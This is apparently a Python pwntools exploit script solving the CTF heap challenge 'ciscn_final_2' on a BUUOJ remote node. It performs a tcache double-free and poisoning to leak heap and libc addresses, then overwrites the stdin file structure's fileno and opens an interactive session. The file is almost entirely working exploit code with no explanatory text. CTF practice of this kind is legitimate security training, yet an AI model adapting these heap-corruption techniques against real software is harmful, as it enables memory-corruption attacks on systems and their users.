# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
import galatea 
context.log_level = 'debug' 
binary = './ciscn_final_2'
elf = ELF('./ciscn_final_2')
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28844'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(num):
    sla(">",num)

def add(type,text):
    cmd(1)
    cmd(type)
    sla(":",text)

def show(type):
    cmd(3)
    cmd(type)

def delete(type):
    cmd(2)
    cmd(type)


add(1,1)
delete(1)

for i in range(4):
    add(2,1)

delete(2)

add(1,1)
delete(2)

show(2)
ru("number :")

heap_addr = int(p.recvuntil("\n"))

lg("heap_addr",int(heap_addr))

add(2, heap_addr - 0xA0)
add(2,0)
delete(1)
add(2,0x30 + 0x20 * 3 + 1)

for i in range(7):
   delete(1)
   add(2,0)

delete(1)
show(1)

ru("number :")

leak_addr = int(p.recvuntil("\n")) - 0x70

lg("leak_addr",int(leak_addr))

__malloc_hook = libc.symbols['__malloc_hook']
stdin_addr = libc.sym['_IO_2_1_stdin_'] 

lg("__malloc_hook",int(__malloc_hook))
lg("stdin_addr",int(stdin_addr))

libc_base = leak_addr - __malloc_hook
stdin_addr = stdin_addr + libc_base

lg("stdin_addr",stdin_addr)

add(2,(stdin_addr + 0x70) & 0xFFFF)
#dbg()
add(1,0)
add(1,666)

cmd(4)
#dbg()


p.interactive()

'''
@File    :   ciscn_final_2.py
@Time    :   2021/07/13 10:11:15
@Author  :   Niyah 
'''